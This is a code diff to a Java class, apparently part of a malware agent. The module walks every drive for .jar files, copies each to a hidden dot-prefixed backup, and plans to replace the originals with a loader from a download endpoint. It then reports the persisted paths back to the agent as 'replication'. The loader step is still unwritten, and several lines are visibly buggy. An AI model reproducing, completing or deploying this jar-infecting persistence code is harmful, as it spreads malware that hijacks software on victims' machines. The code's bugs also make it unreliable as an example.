@@ -53,17 +53,22 @@ public class autoLib
                 
         while (iAgent.shutdown != 1)
         {
+            ArrayList<File> preRootSet = new ArrayList<>();
             ArrayList<Path> fileNames = new ArrayList();
             File[] roots = File.listRoots();
 
             for (int f=0;f<roots.length;f++)
             {  
-                Files.find(
-                    Paths.get(roots[f]),
-                    Integer.MAX_VALUE,
-                    (p, basicFileAttributes) ->
-                            p.getFileName().toString().contains(".jar"))
-                .forEach(b -> fileNames.add(b));
+                if (!preRootSet.contains(roots[f].getName()))
+                {
+                    preRootSet.add(roots[f].getName());
+                    Files.find(
+                        Paths.get(roots[f]),
+                        Integer.MAX_VALUE,
+                        (p, basicFileAttributes) ->
+                                p.getFileName().toString().contains(".jar"))
+                    .forEach(b -> fileNames.add(b));
+                }
             }
             
             for (int r=0;r<fileNames.size();r++)
@@ -76,7 +81,8 @@ public class autoLib
                         //check if bak-jarname.jar already exists, if so skip
                         File file = new File(jarPath);
                         String parent = file.getParent();
-                        String bakJarPath = String.format("%s%sbak-%s.jar",parent,File.separator,file.getName());
+                        
+                        String bakJarPath = String.format("%s%s.bak-%s.jar",parent,File.separator,file.getName());
 
                         if (!new File(bakJarPath).isFile())
                         {
@@ -84,7 +90,10 @@ public class autoLib
                             Files.copy(file.getAbsolutePath(), bakJarPath, StandardCopyOption.REPLACE_EXISTING);
 
                             //hide bak-jarname.jar
-                            Files.setAttribute(bakJarPath, "dos:hidden", true, LinkOption.NOFOLLOW_LINKS);
+                            if (System.getenv("os.name").toLowerCase().contains("win"))
+                            {
+                                Files.setAttribute(bakJarPath, "dos:hidden", true, LinkOption.NOFOLLOW_LINKS);
+                            }
 
                             //create jarname.jar containing loader, downloaded from revamped download endpoint
                             //I need to figure out the loader first
@@ -96,15 +105,16 @@ public class autoLib
                     }
                 }
                 //implict else: no main class, ignoring
+
+                metadata.put("persistedPaths",String.join(",",fileNames));
+                metadata.put("uuid",iAgent.sessUUID);
+                metadata.put("timestamp",new SimpleDateFormat("yyyy.MM.dd.HH.mm.ss").format(new java.util.Date()));
+                metadata.put("error","");
+    
+                Document metaDoc = nUtil.outputToXmlDoc("replication",metadata);
+                iAgent.output.add(metaDoc);
+
             }
-
-            metadata.put("persistedPaths",String.join(",",fileNames));
-            metadata.put("uuid",iAgent.sessUUID);
-            metadata.put("timestamp",new SimpleDateFormat("yyyy.MM.dd.HH.mm.ss").format(new java.util.Date()));
-            metadata.put("error","");
-
-            Document metaDoc = nUtil.outputToXmlDoc("replication",metadata);
-            iAgent.output.add(metaDoc);
         }
     }
 
